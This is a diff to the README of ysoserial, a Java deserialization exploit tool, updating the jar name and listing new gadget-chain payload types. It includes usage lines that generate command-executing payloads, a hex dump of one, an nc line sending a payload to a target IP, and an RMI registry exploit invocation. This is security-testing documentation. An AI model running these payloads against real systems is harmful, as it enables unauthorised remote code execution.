@@ -33,14 +33,18 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ## Usage
 
 ```shell
-$ java -jar ysoserial-0.0.4-all.jar
+$ java -jar ysoserial-0.0.3-with-sleep-payloads.jar
 Y SO SERIAL?
-Usage: java -jar ysoserial-[version]-all.jar [payload type] [payload function] '[command to execute]'
+Usage: java -jar ysoserial-[version]-with-sleep-payloads.jar [payload type] [payload function] '[command to execute]'
         Available payload types:
                 CommonsCollections1
                 CommonsCollections2
+                CommonsCollections3
+                CommonsCollections4
                 Groovy1
-                Spring1   
+                Spring1
+                Jdk7u21
+
         Available payload functions:
                 exec
                 sleep        
@@ -49,7 +53,7 @@ Usage: java -jar ysoserial-[version]-all.jar [payload type] [payload function] '
 ## Examples
 
 ```shell
-$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 exec calc.exe | xxd
+$ java -jar ysoserial-0.0.3-with-sleep-payloads.jar CommonsCollections1 exec calc.exe | xxd
 0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
 0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
 0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
@@ -58,10 +62,10 @@ $ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 exec calc.exe | xxd
 0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
 0000570: 0078 7071 007e 003a                      .xpq.~.:
        
-$ java -jar ysoserial-0.0.4-all.jar Groovy1 exec calc.exe > groovypayload.bin
+$ java -jar ysoserial-0.0.3-with-sleep-payloads.jar Groovy1 exec calc.exe > groovypayload.bin
 $ nc 10.10.10.10 < groovypayload.bin
 
-$ java -cp ysoserial-0.0.4-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 exec calc.exe
+$ java -cp ysoserial-0.0.3-with-sleep-payloads.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 exec calc.exe
 ```
 
 ## Installation
